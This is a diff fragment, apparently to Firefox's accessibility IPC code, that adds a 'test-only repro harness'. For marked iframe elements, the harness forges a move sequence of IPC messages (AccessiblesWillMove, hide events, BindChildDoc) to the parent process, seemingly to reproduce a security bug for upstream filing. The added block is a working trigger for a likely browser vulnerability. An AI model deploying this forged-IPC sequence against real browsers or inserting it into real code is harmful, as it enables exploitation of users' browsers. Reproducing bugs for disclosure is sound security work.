+        case nsIAccessibleEvent::EVENT_HIDE: {
+          // S3 FORGE BEGIN (test-only repro harness; remove before filing
+          // upstream). For the marked iframe element, forge the wire sequence
+          // of a move: AccessiblesWillMove for the marked OuterDoc, then one
+          // mutation batch that hides the marked OuterDoc (its move branch
+          // leaves it detached) and the victim iframe's embedder (unbinding
+          // the victim's child doc), and finally a BindChildDoc of that unbound
+          // child doc under the detached OuterDoc.
+          nsString s3ForgeId;
+          bool s3Forge =
+              HasOwnContent() && mContent->IsElement() &&
+              mContent->AsElement()->GetAttr(nsGkAtoms::id, s3ForgeId) &&
+              s3ForgeId.EqualsLiteral("a11y3-forge");
+          uint64_t s3VictimEmbedderId = 0;
+          RefPtr<DocAccessibleChild> s3VictimIpcDoc;
+          printf_stderr("S3PROBE hide id=%llu forge=%d\n",
+                        static_cast<unsigned long long>(id), s3Forge ? 1 : 0);
+          if (s3Forge) {
+            nsTArray<uint64_t> s3WillMoveIds;
+            s3WillMoveIds.AppendElement(id);
+            ipcDoc->SendAccessiblesWillMove(s3WillMoveIds);
+            if (dom::Element* s3VictimEl =
+                    mDoc->DocumentNode()->GetElementById(u"a11y3-victim"_ns)) {
+              if (LocalAccessible* s3VictimAcc =
+                      mDoc->GetAccessible(s3VictimEl)) {
+                s3VictimEmbedderId = s3VictimAcc->ID();
+                for (uint32_t i = 0; i < s3VictimAcc->ChildCount(); i++) {
+                  LocalAccessible* s3VictimChild = s3VictimAcc->LocalChildAt(i);
+                  if (s3VictimChild && s3VictimChild->IsDoc()) {
+                    s3VictimIpcDoc = s3VictimChild->AsDoc()->IPCDoc();
+                    break;
+                  }
+                }
+              }
+            }
+            printf_stderr("S3PROBE forge outer=%llu victim=%llu ipcdoc=%d\n",
+                          static_cast<unsigned long long>(id),
+                          static_cast<unsigned long long>(s3VictimEmbedderId),
+                          s3VictimIpcDoc ? 1 : 0);
+          }
           ipcDoc->PushMutationEventData(
               HideEventData{id, aEvent->IsFromUserInput()});
+          if (s3Forge) {
+            if (s3VictimEmbedderId) {
+              ipcDoc->PushMutationEventData(
+                  HideEventData{s3VictimEmbedderId, false});
+            }
+            ipcDoc->SendQueuedMutationEvents();
+            if (s3VictimIpcDoc) {
+              ipcDoc->SendBindChildDoc(WrapNotNull(s3VictimIpcDoc.get()), id);
+              printf_stderr("S3PROBE forge bind-sent\n");
+            }
+          }
+          // S3 FORGE END.
           break;
+        }
 
